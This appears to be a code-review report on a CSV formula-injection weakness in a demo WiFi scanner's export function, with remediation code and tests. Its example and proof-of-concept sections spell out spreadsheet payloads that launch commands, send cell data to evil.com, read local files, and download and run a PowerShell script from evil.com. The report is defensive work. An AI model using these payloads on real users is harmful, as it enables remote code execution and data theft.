# CSV Injection Deep Dive Analysis
**Issue:** CSV Injection in Network Scanner WiFi Export
**Location:** `network-scanner/script.js:319-338`
**Date:** 2026-01-04
**Status:** ⚠️ Not Currently Exploitable (But Dangerous Code Pattern)

---

## Executive Summary

**Finding:** The CSV export functionality has **unsafe CSV generation**, but is **NOT exploitable in the current implementation** because WiFi network names come from a hardcoded array, not real network scans.

**Risk Level:**
- **Current:** LOW (no user input path)
- **Future:** HIGH (if real WiFi scanning is implemented)

**Recommendation:** Fix preemptively to prevent future vulnerability

---

## Code Analysis

### The Vulnerable Function

```javascript
// network-scanner/script.js:319-338
function exportWiFiToCSV() {
    const headers = ['Network Name', 'Signal (dBm)', 'Security', 'Channel', 'Frequency', 'Vendor'];
    const rows = wifiNetworks.map(n => [
        n.name,        // ⚠️ No CSV escaping
        n.signal,
        n.security,
        n.channel,
        n.channel > 14 ? '5 GHz' : '2.4 GHz',
        n.vendor
    ]);

    const csv = [headers, ...rows].map(row => row.join(',')).join('\n');  // ⚠️ Simple join, no escaping
    const blob = new Blob([csv], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `wifi-scan-${Date.now()}.csv`;
    a.click();
    URL.revokeObjectURL(url);
}
```

**Problems:**
1. No CSV field escaping
2. No formula injection prevention
3. Assumes data is safe

### Data Flow Analysis

Let me trace where `wifiNetworks` data comes from:

```javascript
// Line 225: Initialize empty array
let wifiNetworks = [];

// Line 232: Populate from devices array
wifiNetworks = devices.filter(d => d.type === 'wifi');

// Line 82-90: devices array populated from hardcoded list
function generateSampleNetworks() {
    const wifiNames = [
        'HomeNetwork_5G', 'NETGEAR87', 'TP-LINK_2.4G', 'Linksys00234',
        'FBI_Surveillance_Van', 'PrettyFlyForAWiFi', 'GetYourOwnWiFi',
        'Skynet_Global', 'TheLANBeforeTime', 'Silence of the LANs'
    ];

    devices = [];
    for (let i = 0; i < 5 + Math.floor(Math.random() * 5); i++) {
        const name = wifiNames[Math.floor(Math.random() * wifiNames.length)];
        // ...
        devices.push(new Device('wifi', name, signal, security, channel));
    }
}
```

**Key Finding:** Network names come from **hardcoded array**, NOT from actual WiFi scans!

### Is Real WiFi Scanning Possible?

Checked for Web APIs that could scan WiFi:

```javascript
// Search for WiFi scanning APIs
navigator.wifi?          // ❌ Does not exist
navigator.network?       // ❌ Does not exist
NetworkInformation API?  // ✅ Exists but only shows connection type, not network names
```

**Conclusion:** Browsers cannot actually scan WiFi networks due to privacy/security restrictions. The "WiFi scanner" is purely demonstration code with fake data.

---

## CSV Injection Vulnerability Explained

### What is CSV Injection?

CSV injection (also called Formula Injection) occurs when:
1. User-controlled data is exported to CSV
2. Data contains special characters: `=`, `+`, `-`, `@`, `|`, `%`
3. Excel/LibreOffice interprets these as formulas
4. Formulas can execute commands or exfiltrate data

### Attack Examples

**Example 1: Command Execution**
```
Network Name: =cmd|'/c calc'!A1
```
When opened in Excel → Calculator launches

**Example 2: Data Exfiltration**
```
Network Name: =WEBSERVICE("https://evil.com/steal?data="&A1)
```
When opened → Sends cell data to attacker

**Example 3: File Reading**
```
Network Name: =IMPORTDATA("file:///C:/Users/victim/passwords.txt")
```
When opened → Reads local files

### Why Current Code is Vulnerable

```javascript
const csv = [headers, ...rows].map(row => row.join(',')).join('\n');
```

If a network name was `=1+1`, the CSV would contain:
```csv
Network Name,Signal (dBm),Security,Channel,Frequency,Vendor
=1+1,-60,WPA2,6,2.4 GHz,TP-Link
```

Excel would evaluate `=1+1` as a formula → displays `2`

---

## Exploitability Assessment

### Current Implementation: NOT EXPLOITABLE ❌

**Why?**
- WiFi names come from hardcoded array
- No API can scan real networks
- No user input path to network names
- Bluetooth names go to different display, not CSV export

**Attack Surface:** ZERO

### Future Implementation Risk: HIGHLY EXPLOITABLE ⚠️

If someone later adds:
- Server-side WiFi scanning (via backend API)
- User-provided network list upload
- Integration with IoT device
- Mock data input for testing

Then the vulnerability becomes **immediately exploitable** with no warning.

---

## Proof of Concept (If Made Exploitable)

### Step 1: Inject Malicious Network Name

Hypothetically, if the app could scan real networks or accept user input:

```javascript
// Hypothetical vulnerable code
devices.push(new Device('wifi', userInput, signal, security, channel));
```

Attacker creates WiFi network with SSID:
```
=cmd|'/c powershell IEX(New-Object Net.WebClient).downloadString("http://evil.com/payload.ps1")'!A1
```

### Step 2: Export to CSV

User clicks "Export CSV" → file downloads:
```csv
Network Name,Signal (dBm),Security,Channel,Frequency,Vendor
=cmd|'/c powershell IEX(New-Object Net.WebClient).downloadString("http://evil.com/payload.ps1")'!A1,-60,WPA2,6,2.4 GHz,Unknown
```

### Step 3: Victim Opens in Excel

Excel shows security warning:
```
The file contains external content. Do you want to update links?
[Yes] [No]
```

If user clicks Yes → Payload downloads and executes

### Step 4: Impact

- Remote code execution on victim's machine
- Runs in victim's user context
- Can steal files, install malware, etc.

**CVSS Score (if exploitable):** 8.1 HIGH
- Attack Vector: Network (attacker controls WiFi SSID)
- Attack Complexity: Low
- Privileges Required: None
- User Interaction: Required (must open CSV)
- Impact: High (RCE potential)

---

## Why This Matters (Even If Not Currently Exploitable)

### 1. Time Bomb Vulnerability

This is a **latent vulnerability** waiting to be triggered:
- Developer adds real WiFi scanning → instant vulnerability
- Developer adds "import network list" → instant vulnerability
- Someone copies this code for another project → vulnerability spreads

### 2. Code Review Blind Spot

Future developers won't know this is unsafe:
- No comments warning about CSV injection
- Code looks clean and simple
- Easy to copy-paste into exploitable contexts

### 3. Defense in Depth

Even though current data is safe, layers of security prevent:
- Future mistakes
- Copy-paste errors
- Feature additions that introduce risk

---

## Recommended Fix

### Option 1: Proper CSV Escaping (Recommended)

```javascript
function escapeCSVField(field) {
    // Convert to string
    field = String(field);

    // Prevent formula injection
    if (/^[=+\-@|%]/.test(field)) {
        field = "'" + field;  // Prefix with single quote to treat as text
    }

    // Escape fields containing special chars
    if (/[,"\n\r]/.test(field)) {
        field = '"' + field.replace(/"/g, '""') + '"';
    }

    return field;
}

function exportWiFiToCSV() {
    const headers = ['Network Name', 'Signal (dBm)', 'Security', 'Channel', 'Frequency', 'Vendor'];
    const rows = wifiNetworks.map(n => [
        escapeCSVField(n.name),      // ✅ Escaped
        escapeCSVField(n.signal),
        escapeCSVField(n.security),
        escapeCSVField(n.channel),
        escapeCSVField(n.channel > 14 ? '5 GHz' : '2.4 GHz'),
        escapeCSVField(n.vendor)
    ]);

    const csv = [headers.map(escapeCSVField), ...rows]
        .map(row => row.join(','))
        .join('\n');

    const blob = new Blob([csv], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `wifi-scan-${Date.now()}.csv`;
    a.click();
    URL.revokeObjectURL(url);
}
```

### Option 2: Use CSV Library

```javascript
// Use Papa Parse or similar
import Papa from 'papaparse';

function exportWiFiToCSV() {
    const data = wifiNetworks.map(n => ({
        'Network Name': n.name,
        'Signal (dBm)': n.signal,
        'Security': n.security,
        'Channel': n.channel,
        'Frequency': n.channel > 14 ? '5 GHz' : '2.4 GHz',
        'Vendor': n.vendor
    }));

    const csv = Papa.unparse(data);  // ✅ Handles escaping automatically

    const blob = new Blob([csv], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `wifi-scan-${Date.now()}.csv`;
    a.click();
    URL.revokeObjectURL(url);
}
```

### Option 3: Add Security Comment (Minimum)

```javascript
function exportWiFiToCSV() {
    // SECURITY: Current implementation uses hardcoded network names which are safe.
    // If this is modified to use real WiFi data or user input, CSV escaping MUST
    // be added to prevent formula injection. See OWASP CSV Injection guide.
    // TODO: Add escapeCSVField() function before accepting dynamic data.

    const headers = ['Network Name', 'Signal (dBm)', 'Security', 'Channel', 'Frequency', 'Vendor'];
    // ... rest of code
}
```

---

## Testing Recommendations

### Test Case 1: Formula Prefix Characters

Create test data with dangerous prefixes:
```javascript
const testNetworks = [
    { name: '=1+1', signal: -50, security: 'WPA2', channel: 6, vendor: 'Test' },
    { name: '+cmd|calc', signal: -50, security: 'WPA2', channel: 6, vendor: 'Test' },
    { name: '-2+2', signal: -50, security: 'WPA2', channel: 6, vendor: 'Test' },
    { name: '@SUM(1:1)', signal: -50, security: 'WPA2', channel: 6, vendor: 'Test' },
];
```

Expected output (with fix):
```csv
Network Name,Signal (dBm),Security,Channel,Frequency,Vendor
'=1+1,-50,WPA2,6,2.4 GHz,Test
'+cmd|calc,-50,WPA2,6,2.4 GHz,Test
```

### Test Case 2: Special Characters

```javascript
const testNetworks = [
    { name: 'Network, with comma', signal: -50, security: 'WPA2', channel: 6, vendor: 'Test' },
    { name: 'Network "quoted"', signal: -50, security: 'WPA2', channel: 6, vendor: 'Test' },
    { name: 'Network\nwith\nnewlines', signal: -50, security: 'WPA2', channel: 6, vendor: 'Test' },
];
```

Expected output (with fix):
```csv
Network Name,Signal (dBm),Security,Channel,Frequency,Vendor
"Network, with comma",-50,WPA2,6,2.4 GHz,Test
"Network ""quoted""",-50,WPA2,6,2.4 GHz,Test
```

### Manual Testing Steps

1. Apply the fix
2. Add test networks to hardcoded array
3. Click "Scan WiFi"
4. Click "Export CSV"
5. Open CSV in Excel
6. Verify formulas are treated as text (display with leading `'`)
7. Check for "External links" warning (should not appear)

---

## Comparison to Other Projects

### Other CSV Exports in Repo

```bash
$ grep -r "\.join(',')" . --include="*.js"
./network-scanner/script.js:    const csv = [headers, ...rows].map(row => row.join(',')).join('\n');
```

**Finding:** Only one CSV export in the entire repository, and it's this one.

### Industry Best Practices

**OWASP Recommendation:**
> "Ensure that all formula-sensitive characters (=, +, -, @, tab, carriage return) are properly escaped before writing to CSV."

**Microsoft Security Advisory:**
> "Prefix cells starting with =, +, -, or @ with a single quote (') to prevent formula interpretation."

**Google Security Blog:**
> "CSV injection is often overlooked but can lead to RCE when exported data contains user input."

---

## Risk Assessment Matrix

| Factor | Current | If Made Dynamic |
|--------|---------|----------------|
| **Exploitability** | None | High |
| **Attack Complexity** | N/A | Low (just set WiFi SSID) |
| **Privileges Required** | N/A | None |
| **User Interaction** | N/A | Required (must open CSV) |
| **Scope** | N/A | Changed (escapes sandbox) |
| **Confidentiality Impact** | None | High (can read files) |
| **Integrity Impact** | None | High (can modify system) |
| **Availability Impact** | None | High (can execute malware) |
| **CVSS Score** | 0.0 None | 8.1 High |

---

## Recommendations

### Priority 1: Add Escaping Function (Preventative)
- Implement `escapeCSVField()` function
- Apply to all CSV fields
- Add unit tests
- **Effort:** 30 minutes
- **Benefit:** Prevents future vulnerability

### Priority 2: Add Security Comments
- Document why escaping is needed
- Warn future developers about CSV injection
- Link to OWASP resources
- **Effort:** 5 minutes
- **Benefit:** Knowledge transfer

### Priority 3: Consider Removing Export Feature
- Feature uses fake data anyway
- Real WiFi scanning not possible in browsers
- Reduces attack surface
- **Effort:** 2 minutes (delete code)
- **Benefit:** Eliminates entire vulnerability class

---

## Conclusion

**Current Status:** Not exploitable (hardcoded data)
**Future Risk:** High (if made dynamic)
**Recommendation:** Fix preemptively
**Priority:** MEDIUM (preventative measure)

The CSV export is **safe today** but is a **vulnerability waiting to happen**. Adding proper escaping now prevents future security incidents and demonstrates secure coding practices.

**Verdict:** Not urgent, but worth fixing as part of security hardening.
